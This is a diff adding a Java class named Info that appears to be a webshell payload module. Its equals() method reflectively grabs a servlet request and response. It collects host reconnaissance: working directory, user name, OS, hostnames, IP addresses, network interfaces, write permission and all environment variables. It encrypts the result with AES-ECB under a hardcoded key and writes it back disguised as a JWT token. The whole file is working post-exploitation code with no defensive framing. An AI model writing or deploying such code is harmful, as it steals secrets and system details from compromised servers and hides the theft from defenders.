@@ -1,0 +1,115 @@
+import javax.crypto.spec.SecretKeySpec;
+import java.nio.charset.StandardCharsets;
+import java.security.SecureRandom;
+import java.util.Base64;
+import java.io.File;
+import java.lang.management.ManagementFactory;
+import java.lang.management.OperatingSystemMXBean;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.util.Enumeration;
+import java.util.Map;
+
+public class Info {
+    @Override
+    public boolean equals(Object obj) {
+        try {
+            Class<?> pcClass = obj.getClass();
+            Object request = pcClass.getMethod("getRequest").invoke(obj);
+            Object response = pcClass.getMethod("getResponse").invoke(obj);
+            write(response,"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."+aesECB(getInfo(),"VcApSBJ570GQhjrK",0)+"."+generateRandom(43));
+        } catch (Exception e) {
+        }
+        return super.equals(obj);
+    }
+    String getInfo(){
+        StringBuilder sb=new StringBuilder();
+        try{
+            sb.append("Working dir : ").append(System.getProperty("user.dir")).append("\n");
+            sb.append("User home : ").append(System.getProperty("user.home")).append("\n");
+            sb.append("Java Version : ").append(System.getProperty("java.version")).append("\n");
+            sb.append("Java Vendor : ").append(System.getProperty("java.vendor")).append("\n");
+            sb.append("Java Home : ").append(System.getProperty("java.home")).append("\n");
+            sb.append("OS Name : ").append(System.getProperty("os.name")).append("\n");
+            sb.append("OS Version : ").append(System.getProperty("os.version")).append("\n");
+            sb.append("OS Arch : ").append(System.getProperty("os.arch")).append("\n");
+            sb.append("User Name : ").append(System.getProperty("user.name")).append("\n");
+            sb.append("Language : ").append(System.getProperty("user.language")).append("\n");
+            sb.append("Country : ").append(System.getProperty("user.country")).append("\n");
+            try{
+                File f=new File("perm_test.tmp");
+                if(f.createNewFile()){sb.append("Write Permission : YES\n");f.delete();}
+                else{sb.append("Write Permission : NO\n");}
+            }catch(Exception e){sb.append("Write Permission : NO\n");}
+            try{
+                InetAddress local=InetAddress.getLocalHost();
+                sb.append("Host Name : ").append(local.getHostName()).append("\n");
+                sb.append("Host Address : ").append(local.getHostAddress()).append("\n");
+                Enumeration<NetworkInterface> nis=NetworkInterface.getNetworkInterfaces();
+                while(nis.hasMoreElements()){
+                    NetworkInterface ni=nis.nextElement();
+                    sb.append("Network Interface : ").append(ni.getName()).append("\n");
+                    Enumeration<InetAddress> addrs=ni.getInetAddresses();
+                    while(addrs.hasMoreElements()){
+                        InetAddress addr=addrs.nextElement();
+                        sb.append("IP Address : ").append(addr.getHostAddress()).append("\n");
+                    }
+                }
+            }catch(Exception e){sb.append("Network Info : ERROR\n");}
+            Runtime rt=Runtime.getRuntime();
+            OperatingSystemMXBean osBean=ManagementFactory.getOperatingSystemMXBean();
+            sb.append("CPU Cores : ").append(rt.availableProcessors()).append("\n");
+            sb.append("System Load : ").append(osBean.getSystemLoadAverage()).append("\n");
+            sb.append("Total Memory(MB) : ").append(rt.totalMemory()/1024/1024).append("\n");
+            sb.append("Free Memory(MB) : ").append(rt.freeMemory()/1024/1024).append("\n");
+            sb.append("Max Memory(MB) : ").append(rt.maxMemory()/1024/1024).append("\n");
+            Map<String,String> env=System.getenv();
+            for(String k:env.keySet()){
+                sb.append("ENV_").append(k).append(" : ").append(env.get(k)).append("\n");
+            }
+        }catch(Exception e){sb.append("Error : ").append(e.getMessage()).append("\n");}
+        return sb.toString();
+    }
+    void write(Object response, String data) throws Exception {
+        Object writer = response.getClass()
+                .getMethod("getWriter")
+                .invoke(response);
+        writer.getClass()
+                .getMethod("write", String.class)
+                .invoke(writer, data);
+    }
+    byte[] aesECB(byte[] data, byte[] key, int mode) {
+        try {
+            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
+            SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
+            cipher.init(mode == 0 ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE, secretKeySpec);
+            return cipher.doFinal(data);
+        } catch (Exception e) {
+            throw new RuntimeException("AES ECB error", e);
+        }
+    }
+    String aesECB(String data, String key, int mode) {
+        try {
+            byte[] keyBytes = key.getBytes(StandardCharsets.UTF_8);
+            if (mode == 0) {
+                byte[] encrypted = aesECB(data.getBytes(StandardCharsets.UTF_8), keyBytes, 0);
+                return Base64.getEncoder().encodeToString(encrypted);
+            } else {
+                byte[] decoded = Base64.getDecoder().decode(data);
+                return new String(aesECB(decoded, keyBytes, 1), StandardCharsets.UTF_8);
+            }
+        } catch (Exception e) {
+            return null;
+        }
+    }
+    String generateRandom(int length) {
+        String charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        SecureRandom random = new SecureRandom();
+        StringBuilder sb = new StringBuilder(length);
+        for (int i = 0; i < length; i++) {
+            int index = random.nextInt(charset.length());
+            sb.append(charset.charAt(index));
+        }
+        return sb.toString();
+    }
+}
